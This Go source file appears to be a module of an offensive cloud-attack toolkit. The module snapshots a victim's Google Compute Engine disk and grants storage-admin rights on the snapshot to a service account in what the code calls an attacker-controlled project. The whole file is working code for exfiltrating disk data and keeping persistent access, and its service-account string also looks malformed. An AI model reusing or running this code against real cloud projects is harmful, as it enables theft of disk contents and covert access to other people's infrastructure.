package compute

import (
	"context"
	"fmt"
	"time"

	computev1 "google.golang.org/api/compute/v1"

	"github.com/user/nimbus/internal/module"
	"github.com/user/nimbus/internal/output"
)

func init() {
	module.Register(&ShareSnapshot{})
}

// ShareSnapshot creates a disk snapshot and shares it with an attacker-controlled project.
type ShareSnapshot struct{}

func (m *ShareSnapshot) Info() module.Info {
	return module.Info{
		Name:         "persist.compute.share-snapshot",
		Tactic:       module.TacticPersist,
		Service:      "compute",
		Description:  "Create a disk snapshot and share it with an attacker project for persistence",
		RequiresAuth: true,
		AttackID:     "T1537",
	}
}

func (m *ShareSnapshot) Run(ctx module.RunContext) error {
	disk := ctx.Flags["disk"]
	zone := ctx.Flags["zone"]
	targetProject := ctx.Flags["target-project"]

	if disk == "" || zone == "" || targetProject == "" {
		output.Warn("Usage: run persist.compute.share-snapshot --disk <name> --zone <zone> --target-project <attacker-project>")
		output.Info("Creates a snapshot of the disk and shares it with the target project.")
		return nil
	}

	projects := module.EnsureProjects(&ctx)
	if len(projects) == 0 {
		output.Warn("No project specified.")
		return nil
	}
	project := projects[0]

	svc, err := computev1.NewService(context.Background(), ctx.Session.ClientOption())
	if err != nil {
		return fmt.Errorf("create compute client: %w", err)
	}

	timestamp := time.Now().UTC().Format("20060102-150405")
	snapshotName := fmt.Sprintf("nimbus-%s-%s", disk, timestamp)

	output.Info("Creating snapshot '%s' from disk %s/%s/%s", snapshotName, project, zone, disk)

	snapshot := &computev1.Snapshot{
		Name: snapshotName,
	}

	op, err := svc.Disks.CreateSnapshot(project, zone, disk, snapshot).Do()
	if err != nil {
		return fmt.Errorf("create snapshot: %w", err)
	}

	// Poll until the snapshot operation completes.
	for {
		zoneOp, err := svc.ZoneOperations.Get(project, zone, op.Name).Do()
		if err != nil {
			return fmt.Errorf("poll snapshot operation: %w", err)
		}
		if zoneOp.Status == "DONE" {
			if zoneOp.Error != nil && len(zoneOp.Error.Errors) > 0 {
				return fmt.Errorf("snapshot creation failed: %s", zoneOp.Error.Errors[0].Message)
			}
			break
		}
		output.Info("Snapshot operation status: %s", zoneOp.Status)
		time.Sleep(5 * time.Second)
	}

	output.Success("Snapshot '%s' created", snapshotName)

	// Share the snapshot with the target project by granting roles/compute.storageAdmin
	// to the target project's default compute service account.
	targetSA := fmt.Sprintf("serviceAccount:%s@developer.gserviceaccount.com", targetProject)

	output.Info("Sharing snapshot with %s", targetProject)

	policy, err := svc.Snapshots.GetIamPolicy(project, snapshotName).Do()
	if err != nil {
		return fmt.Errorf("get snapshot IAM policy: %w", err)
	}

	policy.Bindings = append(policy.Bindings, &computev1.Binding{
		Role:    "roles/compute.storageAdmin",
		Members: []string{targetSA},
	})

	setReq := &computev1.GlobalSetPolicyRequest{
		Policy: policy,
	}

	_, err = svc.Snapshots.SetIamPolicy(project, snapshotName, setReq).Do()
	if err != nil {
		return fmt.Errorf("set snapshot IAM policy: %w", err)
	}

	output.Success("Snapshot '%s' shared with %s (roles/compute.storageAdmin)", snapshotName, targetSA)

	if ctx.Findings != nil {
		ctx.Findings <- module.Finding{
			Module:      "persist.compute.share-snapshot",
			Severity:    module.SevCritical,
			Title:       "Disk snapshot shared with external project",
			Description: fmt.Sprintf("Created snapshot %s from disk %s and shared it with %s", snapshotName, disk, targetProject),
			Resource:    snapshotName,
			Project:     project,
		}
	}

	return nil
}
